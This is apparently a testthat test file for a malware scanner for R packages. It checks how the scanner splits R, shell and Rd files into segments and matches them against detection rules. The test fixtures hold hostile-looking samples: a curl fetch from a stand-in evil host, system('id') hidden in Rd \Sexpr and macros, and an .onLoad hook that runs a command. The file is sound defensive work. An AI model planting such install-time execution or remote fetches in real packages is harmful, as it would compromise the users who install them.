rules <- load_rules()
# extract_segments() -----------------------------------------------------------
# Dispatch is on the source's class, which is the file-context rule's type.

test_that("extract_segments() gives one R segment for an R file", {
  path <- tempfile(fileext = ".R")
  writeLines(c("f <- function() 1", "g <- function() 2"), path)
  on.exit(unlink(path), add = TRUE)

  res <- extract_segments(new_source(path, "R/zzz.R", "R",
                                     namespace_source = TRUE))
  expect_length(res$segments, 1L)
  expect_s3_class(res$segments[[1L]], "R")
  expect_length(res$segments[[1L]]$lines, 2L)
  expect_true(res$segments[[1L]]$named_contexts)
  expect_equal(nrow(res$errors), 0L)
})

test_that("extract_segments() gives a shell segment for shell and make files", {
  path <- tempfile()
  writeLines("curl https://www.evil.test/x", path)
  on.exit(unlink(path), add = TRUE)

  # make inherits shell: one method serves both types.
  for (type in c("shell", "make")) {
    res <- extract_segments(new_source(path, "configure", type))
    expect_length(res$segments, 1L)
    expect_s3_class(res$segments[[1L]], "shell")
    expect_false(res$segments[[1L]]$named_contexts)
  }
})

test_that("extract_segments() splits a help file into its two code segments", {
  path <- tempfile(fileext = ".Rd")
  writeLines(c("\\name{f}", "\\title{T \\Sexpr{system(\"id\")}}",
               "\\examples{", "download.file(u, t)", "}"), path)
  on.exit(unlink(path), add = TRUE)

  res <- extract_segments(new_source(path, "man/f.Rd", "Rd"))
  # The examples, and one per \Sexpr stage present. The page here carries an
  # unlabelled \Sexpr, which is the install stage.
  expect_length(res$segments, 2L)
  # Both are R, analysed by the R methods: extraction and analysis dispatch on
  # separate axes.
  for (s in res$segments) expect_s3_class(s, "R")
  expect_setequal(vapply(res$segments, `[[`, "", "context"),
                  c(.context_rd_examples, .context_rd_sexpr[["install"]]))
  # A hook assigned in an example is not a hook.
  expect_false(any(vapply(res$segments, `[[`, TRUE, "named_contexts")))
})

test_that("extract_segments() fails closed for a type with no method", {
  path <- tempfile()
  writeLines("# not scanned", path)
  on.exit(unlink(path), add = TRUE)

  res <- extract_segments(new_source(path, "NEWS.md", "other"))
  expect_length(res$segments, 0L)
  expect_equal(nrow(res$errors), 0L)
})

test_that("extract_segments() records a read failure against the file", {
  res <- extract_segments(new_source(file.path(tempfile(), "zzz.R"),
                                     "R/zzz.R", "R"))
  expect_length(res$segments, 0L)
  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$step, "read_code")
})

test_that("extract_segments() expands Rd macros when given them", {
  pkg <- tempfile("mp")
  dir.create(file.path(pkg, "man", "macros"), recursive = TRUE)
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)
  writeLines("Package: mp", file.path(pkg, "DESCRIPTION"))
  writeLines("\\newcommand{\\bang}{\\Sexpr{system(\"id\")}}",
             file.path(pkg, "man", "macros", "m.Rd"))
  page <- file.path(pkg, "man", "page.Rd")
  writeLines(c("\\name{p}", "\\title{P}", "\\description{Uses \\bang{} here.}"),
             page)

  with_m <- extract_segments(
    new_source(page, "man/page.Rd", "Rd", tools::loadPkgRdMacros(pkg)))
  expect_length(with_m$segments, 1L)
  expect_match(paste(with_m$segments[[1L]]$lines, collapse = "\n"), "system")

  without <- extract_segments(new_source(page, "man/page.Rd", "Rd", NULL))
  expect_length(without$segments, 0L)
  expect_match(without$errors$message, "unknown macro")
})

# The guard is in the generic, not the methods, so that no method can be written
# that skips it. This once lived in one reader and the Rd path bypassed it.
test_that("extract_segments() enforces the size limit before dispatch", {
  path <- tempfile(fileext = ".Rd")
  writeLines(c("\\name{f}", "\\title{T}",
               paste0("% ", strrep("x", .max_scan_bytes))), path)
  on.exit(unlink(path), add = TRUE)

  res <- extract_segments(new_source(path, "man/f.Rd", "Rd"))
  expect_length(res$segments, 0L)
  expect_equal(res$errors$step, "extract_segments")
  expect_match(res$errors$message, "scanning limit")
})


# analyze_segment() ------------------------------------------------------------
# Dispatch is on the segment's language.

test_that("analyze_segment() finds patterns in an R segment", {
  seg <- new_segment("R", c(".onLoad <- function(l, p) system('id')"),
                     "R/zzz.R", named_contexts = TRUE)
  found <- analyze_segment(seg, rules)
  expect_true("system" %in% found$patterns$rule)
  expect_true("onLoad_base" %in% found$code_contexts$rule)
})

test_that("analyze_segment() withholds named contexts when the segment says so", {
  lines <- ".onLoad <- function(l, p) system('id')"
  expect_equal(nrow(analyze_segment(
    new_segment("R", lines, "man/f.Rd", context = .context_rd_examples,
                named_contexts = FALSE), rules)$code_contexts), 0L)
  expect_gt(nrow(analyze_segment(
    new_segment("R", lines, "R/zzz.R", named_contexts = TRUE),
    rules)$code_contexts), 0L)
})

test_that("analyze_segment() finds matches in a shell segment", {
  seg   <- new_segment("shell", "curl -s https://www.evil.test/x", "configure")
  found <- analyze_segment(seg, rules)
  expect_equal(found$matches$rule, "curl")
  expect_equal(found$matches$preview, "curl -s https://www.evil.test/x")
  expect_equal(nrow(found$patterns), 0L)
})

test_that("analyze_segment() fails closed for a language with no method", {
  found <- analyze_segment(new_segment("python", "import os", "vignettes/v.Rmd"),
                           rules)
  # A segment nothing matches, not an error: an unhandled chunk engine must not
  # look like a failed scan.
  expect_equal(nrow(found$patterns), 0L)
  expect_equal(nrow(found$matches),  0L)
  expect_equal(nrow(found$errors),   0L)
})

test_that("analyze_segment() returns frames with the canonical columns", {
  found <- analyze_segment(new_segment("shell", "curl x", "configure"), rules)
  expect_named(found$code_contexts, names(.empty_code_contexts(FALSE)))
  expect_named(found$patterns,      names(.empty_patterns(FALSE)))
  expect_named(found$matches,       names(.empty_matches(FALSE)))
})

# rbind() accepts a frame carrying an extra column without complaint, so an
# unconformed analyser would corrupt the accumulated result silently. .findings()
# is where that is prevented; the contract cannot be enforced after dispatch
# because UseMethod() ends the generic.
test_that(".findings() drops a column an analyser had no business returning", {
  stray <- .empty_matches(with_phases = FALSE)
  stray[1L, ] <- list("curl", "configure", 1L, 1L, "p", "m", "T1041")
  stray$scratch <- TRUE

  out <- .findings(matches = stray)
  expect_named(out$matches, names(.empty_matches(FALSE)))
  expect_equal(nrow(out$matches), 1L)
})

test_that("a shell rule is never evaluated against another language", {
  r <- rules
  r$matches$language <- "python"
  found <- analyze_segment(new_segment("shell", "curl x", "configure"), r)
  expect_equal(nrow(found$matches), 0L)
})
